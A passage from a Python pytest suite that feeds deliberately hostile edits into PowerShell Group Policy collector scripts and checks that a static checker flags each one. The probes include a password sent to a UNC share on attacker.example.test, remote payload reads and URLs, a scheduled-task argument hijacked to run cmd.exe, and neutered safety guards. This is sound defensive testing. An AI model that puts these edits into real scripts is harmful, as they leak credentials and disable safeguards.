        "r4x_scope_moved_binding",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    param([string]$Marker)\n",
            "    param([string]$Marker)\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n",
        ),
    ),
    # Cross-repo class 1: re-cased command / method / parameter names.
    (
        "r4x_case_new_object_com",
        "Export-GpoEstate.ps1",
        "append",
        "nEw-ObJeCt -comobject 'WScript.Shell'\n",
    ),
    (
        "r4x_case_remove_item_duplicate",
        "Run-GpoLensCollection.ps1",
        "append",
        "remove-item -literalpath $folder -recurse -force\n",
    ),
    (
        "r4x_case_lifetime_dispose",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
            "    $LOCK.dispose()\n",
        ),
    ),
    # --- DeepSeek round 4 NEW-BLOCKING-1 (helper and guard bodies) ---
    (
        "r4d_helper_taskarg_hijack",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
            "    return '\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c whoami'\n",
        ),
    ),
    (
        "r4d_helper_early_return_getcompleted",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $candidates = @(Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' "
            "-ErrorAction Stop |",
            "    return (Get-Item -LiteralPath 'C:\\Windows\\Temp\\evil.zip')\n",
        ),
    ),
    (
        "r4d_guardbody_assert_regular_tree",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "        if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
            "            throw 'Retention refuses a linked export folder or file.'\n"
            "        }\n"
            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n"
            "            if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
            "                throw 'Retention refuses a linked export folder or file.'\n"
            "            }\n",
            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n",
        ),
    ),
    (
        "r4d_helper_owner_guard_neutered",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "    if (-not [string]::Equals($owner, $TaskName, "
            "[StringComparison]::OrdinalIgnoreCase)) {\n"
            '        throw "Collection refuses output root owner',
            '    if ($false) {\n        throw "Collection refuses output root owner',
        ),
    ),
    (
        "r4d_helper_entry_change",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
            "            if ($zip.GetEntry('evil.xml')) { $archive }",
        ),
    ),
    (
        "r4d_helper_marker_linkcount_neutered",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "        if ($links -ne 1) { throw 'Collection refuses a linked owner marker.' }\n",
            "        if ($links -ne 1) { Write-Warning 'link count ignored' }\n",
        ),
    ),
    (
        "r4d_helper_filter_change",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop |",
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.*' -ErrorAction Stop |",
        ),
    ),
    (
        "r4d_guardbody_owner_guard_return",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "        throw 'Registration refuses a linked output root.'\n",
            "        Write-Warning 'skip linked output root'\n",
        ),
    ),
    # DeepSeek NON-BLOCKING-1: a static call on a computed type must be a clean
    # check failure (it crashed _write_targets at 64411db).
    (
        "r4d_static_computed_type",
        "Export-GpoEstate.ps1",
        "append",
        "$t = [IO.File]\n$t::Delete('C:\\Windows\\Temp\\x')\n",
    ),
    # DeepSeek NON-BLOCKING-3: a UTF-8 BOM (old golden: SAME; digest was of
    # BOM-stripped text).
    ("r4d_bom", "Export-GpoEstate.ps1", "prepend", "\ufeff"),
    # --- Round-5 candidates (Sol), each previously accepted ---
    # B1: an extra allowlisted output/read command exfiltrates the password.
    (
        "r5s_credential_console_exfil",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            '        Write-Host "captured=$taskPassword"\n',
        ),
    ),
    (
        "r5s_credential_unc_exfil",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            '        Get-Item -LiteralPath "\\\\attacker.example.test\\share\\$taskPassword" '
            "| Out-Null\n",
        ),
    ),
    (
        "r5s_arbitrary_unc_read",
        "Export-GroupMembers.ps1",
        "append",
        "Get-Content -LiteralPath '\\\\attacker.example.test\\share\\payload.txt' | Write-Host\n",
    ),
    # Same class: a copy of the secret to another variable (no new command).
    (
        "r5x_secret_copy",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            "        $gateLeak = $taskPassword\n",
        ),
    ),
    # Non-blocking: ShouldProcess turned off in the script header.
    (
        "r5s_shouldprocess_false",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "[CmdletBinding(SupportsShouldProcess, DefaultParameterSetName = 'Gmsa')]",
            "[CmdletBinding(SupportsShouldProcess=$false, DefaultParameterSetName = 'Gmsa')]",
        ),
    ),
    # B2: the task-name validator removed again.
    (
        "r5s_taskname_validator_removed",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    [ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]\n"
            "    [string]$TaskName = 'GpoLensCollection',",
            "    [string]$TaskName = 'GpoLensCollection',",
        ),
    ),
    # --- Round-6 candidates (Sol), each previously accepted ---
    # 1: a command-argument variable rebound to a remote path.
    (
        "r6s_remote_read_by_argument_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "    $metaPath = Join-Path $out 'gpo-metadata.json'\n",
            "    $metaPath = Join-Path $out 'gpo-metadata.json'\n"
            "    $metaPath = '\\\\attacker.example.test\\share\\payload.json'\n",
        ),
    ),
    # 2: guard-predicate variables rebound.
    (
        "r6s_force_unregister_by_guard_rebind",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    $ErrorActionPreference = 'Stop'\n",
            "    $ErrorActionPreference = 'Stop'\n    $Unregister = $true\n",
        ),
    ),
    (
        "r6s_force_real_run_by_guard_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$ErrorActionPreference = 'Stop'\n",
            "$ErrorActionPreference = 'Stop'\n$DryRun = $false\n",
        ),
    ),
    (
        "r6s_silently_skip_sysvol_by_guard_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$ErrorActionPreference = 'Stop'\n",
            "$ErrorActionPreference = 'Stop'\n$SkipSysvol = $true\n",
        ),
    ),
    # Same class: remote-looking literals bound to a variable anywhere.
    (
        "r6x_remote_literal_expandable",
        "Run-GpoLensCollection.ps1",
        "append",
        '$gateShare = "\\\\$env:COMPUTERNAME\\c$\\gate"\n',
    ),
    (
        "r6x_remote_literal_url",
        "Export-Principals.ps1",
        "append",
        "$gateUrl = 'https://attacker.example.test/payload'\n",
    ),
    # --- DeepSeek round 5 BL-1: 2-char prefix -Pi of -PipelineVariable ---
    (
        "r5d_pi_rebind_dest_copy",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "            Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
            "-ErrorAction Stop\n",
            "            Get-Item -LiteralPath 'C:\\Windows\\Temp' -Pi dest | "
            "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
            "-ErrorAction Stop\n",
        ),
    ),
    (
        "r5d_pi_only_getitem",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -Pi knownIds | Out-Null\n",
    ),
    (
        "r5d_pi_rebind_receiver",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -Pi stream | Out-Null\n",
    ),
    (
        "r5d_pi_rebind_out_before_write",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$allGpos = Get-GPO -All\n",
            "Get-Item -LiteralPath '/etc/hostname' -Pi out | Out-Null\n$allGpos = Get-GPO -All\n",
        ),
    ),
    # Alias form of the same class.
    (
        "r5d_ov_alias_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -ov OutputRoot | Out-Null\n",
    ),
    # DeepSeek round-5 NB-3: a parameter that no real cmdlet parameter matches.
    (
        "r5d_unknown_parameter",
        "Export-GpoEstate.ps1",
        "append",
        "Get-ChildItem -LiteralPath 'C:\\x' -OutFile 'C:\\Windows\\Temp\\y'\n",
    ),
]

# NON-BL-3: the regression suite asserts WHICH substantive check flagged each
# probe, not merely that one did (so a parse error can never masquerade as a
# catch). Maps probe id -> the check name expected to raise.
_PROBE_EXPECTED_CHECK: dict[str, str] = {
    "sol_root_rebind": "pinned_bindings",
    "sol_registry_rebind": "pinned_bindings",
    "sol_set_itemtype": "writes",
    "sol_redirection": "redirections",
    "sol_redirection_stream": "redirections",
    "sol_get_gporeport_path": "writes",
    "sol_instance_delete": "dotnet",
    "sol_adsi_delete": "types",
    "sol_using_module": "usings",
    "sol_collector_rebind": "pinned_bindings",
    "sol_task_abuse": "task_action",
    "ds_writeroot_var": "pinned_bindings",
    "ds_writeroot_run": "pinned_bindings",
    "ds_adsi_copyto_marker": "types",
    "ds_register_args": "task_action",
    "ds_using_assembly": "usings",
    "neg_set_adobject": "commands",
    "neg_adsi_commit": "types",
    "neg_dynamic_member": "dotnet",
    "neg_com": "new_object_and_add_type",
    "neg_namespace_de": "usings",
    "neg_splat_write": "writes",
    "neg_addtype_inline": "new_object_and_add_type",
    "neg_import_module_unc": "commands",
    "r2_outvariable_rebind_root": "pinned_bindings",
    "r2_pipelinevariable_rebind_root": "pinned_bindings",
    "r2_errorvariable_rebind_root": "pinned_bindings",
    "r2_warningvariable_rebind_root": "pinned_bindings",
    "r2_informationvariable_rebind_root": "pinned_bindings",
    "r2_collectorpath_outvariable_override": "pinned_bindings",
    "r2_taskargs_outvariable_override": "pinned_bindings",
    "r2_parenthesized_receiver_delete": "instance_receivers",
    "r2_parenthesized_receiver_open_write": "instance_receivers",
    "r2_parenthesized_fileinfo_copyto_sysvol": "instance_receivers",
    "r2_wmi_remote_instance_delete": "types",
    "r2_taskname_direct_rebind": "pinned_bindings",
    "r2_task_unregister_wildcard": "task_action",
    "r2_task_register_remote_cimsession": "task_action",
    "r2_task_principal_runlevel_highest": "task_action",
    "r2_env_via_second_variable": "writes",
    "r2_dotdot_via_second_variable": "writes",
    "r2_computed_dotdot_via_second_variable": "writes",
    "r2_new_item_name_traversal": "writes",
    "ds_dotdot_child_var": "writes",
    "ds_interp_child": "writes",
    "ds_writealltext_child": "writes",
    "ds_copyitem_child": "writes",
    "ds_getgporeport_child": "writes",
    "ds_function_wrapped_write": "writes",
    "ds_script_scope_outputroot": "pinned_bindings",
    "ds_foreach_abs_root": "pinned_bindings",
    "ds_script_collectorpath": "pinned_bindings",
    "ds_script_windowsroot": "pinned_bindings",
    "ds_script_logpath": "pinned_bindings",
    "r3_receiver_rebind_delete": "pinned_bindings",
    "r3_unregister_duplicate": "guarded_ops",
    "r3_alias_provider": "bindings",
    "r3_requires_module": "ast",
    "r3_guard_or_to_and": "guarded_ops",
    "r3_reorder_guard_after_open": "guarded_ops",
    "r3_psdefault_register_cimsession": "bindings",
    "r3_psdefault_export": "bindings",
    "r3_psdefault_run": "bindings",
    "r3_reorder_retention_guard": "guarded_ops",
    "r3_outvariable_computed": "bindings",
    "r3_outvariable_indirect_var": "bindings",
    "r3_errorvariable_computed": "bindings",
    "r3_outvariable_braced": "bindings",
    "r3_member_later_argument": "guarded_ops",
    "r3_marker_open_mode": "guarded_ops",
    "r4_marker_root_rebind": "pinned_bindings",
    "r4_callsite_marker_root": "pinned_bindings",
    "r4_callsite_log_path": "pinned_bindings",
    "r4_multi_assignment_root": "bindings",
    "r4_drive_variable_write": "bindings",
    "r4_env_psmodulepath": "bindings",
    "r4_foreach_object_member": "commands",
    "r4_guard_function_redefined": "local_functions",
    "r4_safe_name_rebind": "pinned_bindings",
    "r4_ref_rebind_root": "pinned_bindings",
    "r4s_helper_returns_outside_file": "local_function_bodies",
    "r4s_task_quote_helper_remote_script": "local_function_bodies",
    "r4d_helper_taskarg_append": "local_function_bodies",
    "r4d_helper_abspath_change": "local_function_bodies",
    "r4s_early_lock_dispose": "guarded_ops",
    "r4s_caller_guard_duplicate_marker_write": "guarded_ops",
    "r4s_add_type_path": "new_object_and_add_type",
    "r4s_here_string_crlf": "ast",
    "r4x_foreach_object_scope_rebind": "pinned_bindings",
    "r4x_where_object_scope_rebind": "pinned_bindings",
    "r4x_intrinsic_foreach_scope_rebind": "pinned_bindings",
    "r4x_scope_moved_binding": "pinned_bindings",
    "r4x_case_new_object_com": "new_object_and_add_type",
    "r4x_case_remove_item_duplicate": "guarded_ops",
    "r4x_case_lifetime_dispose": "guarded_ops",
    "r4d_helper_taskarg_hijack": "local_function_bodies",
    "r4d_helper_early_return_getcompleted": "local_function_bodies",
    "r4d_guardbody_assert_regular_tree": "local_function_bodies",
    "r4d_helper_owner_guard_neutered": "local_function_bodies",
    "r4d_helper_entry_change": "local_function_bodies",
    "r4d_helper_marker_linkcount_neutered": "local_function_bodies",
    "r4d_helper_filter_change": "local_function_bodies",
    "r4d_guardbody_owner_guard_return": "local_function_bodies",
    "r4d_static_computed_type": "dotnet",
    "r4d_bom": "ast",
    "r5s_credential_console_exfil": "secret_uses",
    "r5s_credential_unc_exfil": "secret_uses",
    "r5s_arbitrary_unc_read": "remote_paths",
    "r5x_secret_copy": "secret_uses",
    "r5s_shouldprocess_false": "script_header",
    "r5s_taskname_validator_removed": "task_name_validator",
    "r6s_remote_read_by_argument_rebind": "pinned_bindings",
    "r6s_force_unregister_by_guard_rebind": "pinned_bindings",
    "r6s_force_real_run_by_guard_rebind": "pinned_bindings",
    "r6s_silently_skip_sysvol_by_guard_rebind": "pinned_bindings",
    "r6x_remote_literal_expandable": "remote_literals",
    "r6x_remote_literal_url": "remote_literals",
    "r5d_pi_rebind_dest_copy": "pinned_bindings",
    "r5d_pi_only_getitem": "pinned_bindings",
    "r5d_pi_rebind_receiver": "pinned_bindings",
    "r5d_pi_rebind_out_before_write": "pinned_bindings",
    "r5d_ov_alias_rebind": "pinned_bindings",
    "r5d_unknown_parameter": "commands",
}


def _apply_edit(text: str, mode: str, edit: str | tuple[str, str]) -> str:
    if mode == "append":
        assert isinstance(edit, str)
        return text + "\n" + edit
    if mode == "prepend":
        assert isinstance(edit, str)
        return edit + text
    assert isinstance(edit, tuple)
    anchor, change = edit
    assert text.count(anchor) == 1, f"edit anchor must occur exactly once: {anchor!r}"
    if mode == "before":
        return text.replace(anchor, change + anchor, 1)
    assert mode == "replace", mode
    return text.replace(anchor, change, 1)


def _modified_inventory(
    exe: str,
    base: str,
    position: str,
    snippet: str | tuple[str, str],
    dest: Path,
    extra_files: dict[str, str] | None = None,
) -> dict[str, dict[str, Any]]:
    copy = dest / "scripts"
    copy.mkdir(parents=True, exist_ok=True)
    for name in POLICIES:
        text = (_SCRIPTS / name).read_text(encoding="utf-8")
        if name == base:
            text = _apply_edit(text, position, snippet)
        (copy / name).write_text(text, encoding="utf-8")
    for extra_name, extra_text in (extra_files or {}).items():
        (copy / extra_name).write_text(extra_text, encoding="utf-8")
    return _run_dumper(exe, [str(copy / name) for name in sorted(POLICIES)])


def test_every_probe_has_an_expected_check() -> None:
    ids = {p[0] for p in _REGRESSIONS}
    assert ids == set(_PROBE_EXPECTED_CHECK), (
        "every probe needs an expected check: "
        f"missing {sorted(ids - set(_PROBE_EXPECTED_CHECK))}, "
        f"stale {sorted(set(_PROBE_EXPECTED_CHECK) - ids)}"
    )


@pytest.mark.parametrize("probe", _REGRESSIONS, ids=[p[0] for p in _REGRESSIONS])
def test_reviewer_probes_are_flagged(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    exe = _pwsh()
    extra = {"GateEvil.psm1": "'x' > './canary.txt'\n"} if "using_module" in probe_id else None
    inv = _modified_inventory(exe, base, position, snippet, tmp_path, extra)
    failed = _run_checks(base, inv)
    expected = _PROBE_EXPECTED_CHECK[probe_id]
    # The probe must be caught by its intended substantive check, not by a parse
    # error (NON-BL-3). The `using` probes deliberately fail parsing too, so
    # `parse` is tolerated only there.
    if "using" not in probe_id:
        assert "parse" not in failed, f"{probe_id}: flagged only by a parse error: {failed}"
    assert expected in failed, (
        f"{probe_id}: expected check {expected!r} did not flag it; raised {sorted(failed)}"
    )
    # Both layers: the edit also changes the committed syntax-tree inventory.
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], (
        f"{probe_id}: the golden syntax-tree inventory did not change"
    )


# Edits the semantic layer deliberately admits (no write/exec/binding effect)
# but the golden inventory must still catch, so a reviewer sees them.
_GOLDEN_ONLY: list[Probe] = [
    # Sol round-3 collision_return: a trailing `return` (old inventory: SAME).
    ("r3_trailing_return", "Export-GpoEstate.ps1", "append", "return\n"),
    # A changed log/progress message (content, not a write target).
    (
        "r4_message_text",
        "Export-GpoEstate.ps1",
        "replace",
        ('Write-Host "DryRun: would export the following:"', 'Write-Host "DryRun: would export:"'),
    ),
    # Sol round-5 top_level_exit: a trailing `exit 0` (documented top-level limit).
    ("r5s_top_level_exit", "Export-GpoEstate.ps1", "append", "exit 0\n"),
    # Comment-only edit: AST identical, source digest differs.
    ("r4_comment_only", "Run-GpoLensCollection.ps1", "append", "# reviewer note\n"),
]


@pytest.mark.parametrize("probe", _GOLDEN_ONLY, ids=[p[0] for p in _GOLDEN_ONLY])
def test_golden_catches_semantically_neutral_edits(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    inv = _modified_inventory(_pwsh(), base, position, snippet, tmp_path)
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], f"{probe_id}: golden did not change"
    if probe_id == "r4_comment_only":
        assert _canonical(inv[base])["ast"] == committed[base]["ast"]
    else:
        assert _canonical(inv[base])["ast"] != committed[base]["ast"]


# ---------------------------------------------------------------------------
# Completeness of the syntax-tree serialization (meta-tests).
# ---------------------------------------------------------------------------

# Properties the serializer deliberately skips on every node type, and why.
_EXCLUDED_AST_PROPERTIES = {
    "*.Parent": "back-reference; structure is the row nesting",
    "*.Extent": "source position/text; the text is represented by the child nodes",
    "*.ErrorPosition": "source position of an operator token",
    "*.StaticType": "derived by the parser from the node type, constant or cast",
    "ConvertExpressionAst.Attribute": "the same object as ConvertExpressionAst.Type",
}
_KNOWN_REQUIREMENT_PROPERTIES = {
    "IsElevationRequired",
    "RequiredApplicationId",
    "RequiredAssemblies",
    "RequiredModules",
    "RequiredPSEditions",
    "RequiredPSVersion",
    "RequiresPSSnapIns",  # Windows PowerShell 5.1 only
}


def test_serializer_covers_every_ast_node_type() -> None:
    """Every concrete Ast type of the running PowerShell is in the serializer
    table, and every one of its public properties is serialized or excluded
    with a stated reason. A new PowerShell node type or property fails here.
    (A listed property this runtime lacks, e.g. ScriptBlockAst.CleanBlock before
    7.3, is skipped by the serializer, so it is not an error.)"""
    described = _run_dumper_raw(_pwsh(), [], "-Describe")
    table = described["table"]
    assert set(described["excluded"]) == set(_EXCLUDED_AST_PROPERTIES)
    problems: list[str] = []
    for node in described["ast_types"]:
        name = node["name"]
        if name not in table:
            problems.append(f"{name}: not in the serializer table")
            continue
        listed = set(table[name])
        for prop in node["properties"]:
            if prop in listed or f"*.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            if f"{name}.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            problems.append(f"{name}.{prop}: neither serialized nor excluded")
    assert not problems, "serializer table is incomplete:\n" + "\n".join(problems)
    unknown = set(described["script_requirements_properties"]) - _KNOWN_REQUIREMENT_PROPERTIES
    assert not unknown, f"new #Requires properties: {sorted(unknown)}"


# One construct per node type the collectors do not use, so the serializer is
# exercised on all of them (and the semantic layer's closed node set refuses
# them). Parsed only.
_EXOTIC_SOURCE = """#Requires -Version 5.1
using namespace System.Text
class GateBox : System.Object {
    [string] $Name = 'x'
    hidden static [int] $Count
    GateBox() { $this.Name = 'y' }
    [string] Show([int] $n) { return $this.Name * $n }
}
enum GateColor { Red = 1; Blue }
function Get-Gate { [CmdletBinding()] param([Parameter(Mandatory)][ValidateNotNull()] $a)
    dynamicparam { }
    begin { trap { continue } }
    process { do { $a-- } until ($a -lt 0); do { break } while ($false) }
    end { data GateData { 'x' }; $b = $a ? 1 : 2; Get-Item . && Get-Item .. || Get-Item / }
}
filter Test-Gate { $_ }
$x = [GateBox]::new(); $x.Show(2) | Out-Null
$s = { param($q) $using:q }
Start-Sleep 1 &
foreach -parallel ($i in 1..2) { $i }
switch -regex ('a') { 'a' { 1 } default { 2 } }
$h = @{ k = 1 }; $h['k'] += 2; [int]$h.k
"text $($h.k)" | Out-Null; @'
here
'@ | Out-Null
"""


def test_serializer_handles_every_node_type(tmp_path: Path) -> None:
    source = tmp_path / "exotic.ps1"
    source.write_bytes(_EXOTIC_SOURCE.encode("ascii"))
    entry = _run_dumper_raw(_pwsh(), [str(source)])[0]
    assert entry["unsupported_nodes"] == [], entry["unsupported_nodes"]
    lines = _canonical(entry)["ast"]
    assert lines[0].startswith("Script: ScriptBlockAst ScriptRequirements=")
    used = set(entry["node_types"])
    for kind in (
        "TypeDefinitionAst",
        "PropertyMemberAst",
        "FunctionMemberAst",
        "TrapStatementAst",
        "DataStatementAst",
        "TernaryExpressionAst",
        "PipelineChainAst",
        "UsingExpressionAst",
        "DoUntilStatementAst",
        "DoWhileStatementAst",
        "UsingStatementAst",
        "BaseCtorInvokeMemberExpressionAst",
    ):
        if kind == "BaseCtorInvokeMemberExpressionAst":
            continue  # only produced for `: base(...)`; covered by the table test
        assert kind in used, f"exotic source did not produce {kind}"
    # Every one of them is outside the closed node set.
    assert used - ALLOWED_NODE_TYPES


# Single-token mutations by token kind / operator text.
_OPERATOR_SWAPS = {
    "-eq": "-ne",
    "-ne": "-eq",
    "-or": "-and",
    "-and": "-or",
    "-band": "-bor",
    "-bor": "-band",
    "-gt": "-ge",
    "-ge": "-gt",
    "-lt": "-le",
    "-le": "-lt",
    "-match": "-notmatch",
    "-notmatch": "-match",
    "-like": "-notlike",
    "-notlike": "-like",
    "-contains": "-notcontains",
    "-notcontains": "-contains",
    "-in": "-notin",
    "-notin": "-in",
    "-is": "-isnot",
    "-isnot": "-is",
    "-not": "-bnot",
    "-replace": "-creplace",
    "-split": "-csplit",
    "-join": "-split",
    "-f": "-join",
    "+": "-",
    "-": "+",
    "*": "/",
    "/": "*",
    "=": "+=",
    "+=": "=",
    "++": "--",
    "--": "++",
    "2>": "3>",
    "*>&1": "*>&2",
    "break": "continue",
    "continue": "break",
}


def _token_mutation(token: dict[str, Any]) -> str | None:
    kind, text = token["kind"], token["text"]
    if kind in ("Variable", "SplattedVariable"):
        return text[:-1] + "Q}" if text.endswith("}") else text + "Q"
    if kind == "Parameter":
        return text[:-1] + "Q:" if text.endswith(":") else text + "Q"
    if kind == "Number":
        return "8" if text == "7" else "7"
    if kind in ("StringLiteral", "StringExpandable"):
        return text[0] + "Q" + text[1:]
    if kind in ("HereStringLiteral", "HereStringExpandable"):
        cut = text.index("\n") + 1
        return text[:cut] + "Q" + text[cut:]
    if kind in ("Identifier", "Generic"):
        return text + "Q"
    return _OPERATOR_SWAPS.get(text.casefold())


def _evenly(items: list[Any], count: int) -> list[Any]:
    if len(items) <= count:
        return list(items)
    step = (len(items) - 1) / (count - 1)
    return [items[round(i * step)] for i in range(count)]


def _mutants(source: str, sites: dict[str, Any]) -> list[tuple[str, str]]:
    """(label, mutated source) pairs that must each change the syntax tree."""
    out: list[tuple[str, str]] = []
    tokens = [t for t in sites["tokens"] if _token_mutation(t) is not None]
    for t in _evenly(tokens, 40):
        new = _token_mutation(t)
        assert new is not None
        out.append(
            (
                f"token {t['kind']} {t['text']!r}@{t['start']}",
                source[: t["start"]] + new + source[t["end"] :],
            )
        )
    swaps = []
    for s1, e1, s2, e2 in sites["siblings"]:
        if _norm(source[s1:e1]) != _norm(source[s2:e2]):
            swaps.append((s1, e1, s2, e2))
    for s1, e1, s2, e2 in _evenly(swaps, 15):
        swapped = source[:s1] + source[s2:e2] + source[e1:s2] + source[s1:e1] + source[e2:]
        out.append((f"swap statements @{s1}/{s2}", swapped))
    for start, end in _evenly(list(sites["conditions"]), 12):
        out.append(
            (
                f"negate condition @{start}",
                source[:start] + "-not (" + source[start:end] + ")" + source[end:],
            )
        )
    inserts = [*_evenly(list(sites["block_starts"]), 3), len(source)]
    for pos in inserts:
        for label, stmt in (
            ("index assignment", "$PSDefaultParameterValues['Get-Item:Force'] = $true\n"),
            ("return", "return\n"),
        ):
            sep = "" if pos == 0 or source[pos - 1] in "\n " else "\n"
            out.append((f"insert {label} @{pos}", source[:pos] + sep + stmt + source[pos:]))
    out.append(("#Requires module", "#Requires -Modules GpoLensProbe\n" + source))
    out.append(("#Requires elevation", "#Requires -RunAsAdministrator\n" + source))
    return out


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_inventory_detects_systematic_mutations(tmp_path: Path, script: str) -> None:
    """Generic completeness evidence: for each collector, mutate the source in
    systematic ways — change single tokens (evenly sampled over every mutable
    token: variables, parameters, numbers, strings, here-strings, identifiers,
    command names, operators, redirections, keywords), swap adjacent
    statements, negate conditions, insert an index assignment / `return`, add
    `#Requires` — and require the serialized syntax tree to differ for every
    mutant that still parses. Comment/whitespace-only edits must leave the tree
    unchanged but change the source digest, and so must CRLF line endings
    (the digest is over exact bytes; .gitattributes pins LF and check_ast
    refuses CR)."""
    exe = _pwsh()
    path = _SCRIPTS / script
    source = path.read_bytes().decode("ascii")
    sites = _run_dumper_raw(exe, [str(path)], "-Sites")[0]
    original = _canonical(_run_dumper_raw(exe, [str(path)], "-AstOnly")[0])
    mutants = _mutants(source, sites)
    files: list[Path] = []
    for i, (_label, text) in enumerate(mutants):
        target = tmp_path / f"m{i:04d}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    neutral = {
        "comment": "# reviewer comment\n" + source,
        "whitespace": "\n\n" + source.replace("\n", "  \n", 1),
        "crlf": source.replace("\n", "\r\n"),
    }
    for name, text in neutral.items():
        target = tmp_path / f"neutral-{name}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    results = _run_dumper_raw(exe, [str(f) for f in files], "-AstOnly", timeout=900)
    by_path = {Path(r["path"]).name: _canonical(r) for r in results}
    undetected: list[str] = []
    clean = 0
    for i, (label, _text) in enumerate(mutants):
        mutant = by_path[f"m{i:04d}.ps1"]
        if mutant["parse_errors"]:
            continue
        clean += 1
        if mutant["ast"] == original["ast"]:
            undetected.append(label)
    assert not undetected, f"{script}: mutations not reflected in the syntax tree: {undetected}"
    assert clean >= len(mutants) * 0.6, f"{script}: only {clean}/{len(mutants)} mutants parsed"
    for name in ("comment", "whitespace"):  # AST-neutral by construction
        changed = by_path[f"neutral-{name}.ps1"]
        assert changed["ast"] == original["ast"], f"{script}: {name}-only edit changed the tree"
        assert changed["source_sha256"] != original["source_sha256"], name
    crlf = by_path["neutral-crlf.ps1"]
    assert crlf["source_sha256"] != original["source_sha256"], f"{script}: CRLF not detected"


def test_generator_never_writes_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The generator writes only the golden file. The semantic policy tables
    (POLICIES, PINNED_VARS, GUARDED_OPS, LOCAL_FUNCTION_BODIES, ...) are hand-
    maintained in this file, so a regeneration can never widen them."""
    import inspect

    generator = (_REPO / "scripts" / "gen_collector_inventory.py").read_text(encoding="utf-8")
    for token in (
        "PINNED_VARS",
        "GUARDED_OPS",
        "LOCAL_FUNCTION_BODIES",
        "SECRET_USES",
        "SCRIPT_HEADERS",
        "POLICIES",
        "write_text",
        "write_bytes",
        "open(",
    ):
        assert token not in generator, f"generator must not touch {token}"
    source = inspect.getsource(write_golden_inventory)
    assert source.count("write_text") == 1 and "GOLDEN_PATH.write_text(" in source
    for token in ("write_bytes", "open("):
        assert token not in source
    guarded = sorted((_REPO / "tests").rglob("*.py")) + sorted((_REPO / "scripts").glob("*"))
    before = {p: p.read_bytes() for p in guarded if p.is_file()}
    monkeypatch.setitem(globals(), "GOLDEN_PATH", tmp_path / "collector-inventory.json")
    write_golden_inventory(_pwsh())
    assert (tmp_path / "collector-inventory.json").is_file()
    assert {p: p.read_bytes() for p in before} == before, "generator modified a tracked file"


# Letters outside quoted strings are re-cased; string contents are data and stay.
def _random_case(text: str, seed: str) -> str:
    # Deterministic per-character coin from the seed (reproducible, no RNG state).
    bits = hashlib.sha256(seed.encode()).digest() * (len(text) // 256 + 1)
    out: list[str] = []
    quote: str | None = None
    for i, ch in enumerate(text):
        if quote:
            out.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in "'\"":
            quote = ch
            out.append(ch)
            continue
        flip = (bits[i // 8] >> (i % 8)) & 1
        out.append(ch.upper() if ch.isalpha() and flip else ch.lower())
    return "".join(out)


def _random_case_edit(mode: str, edit: str | tuple[str, str], seed: str) -> str | tuple[str, str]:
    if isinstance(edit, str):
        return _random_case(edit, seed)
    anchor, change = edit
    return (anchor, _random_case(change, seed))


def test_regression_verdicts_are_case_insensitive(tmp_path: Path) -> None:
    """Cross-repo class (adcs-lens `_WRITEJSON` vs `_writeJson`): PowerShell
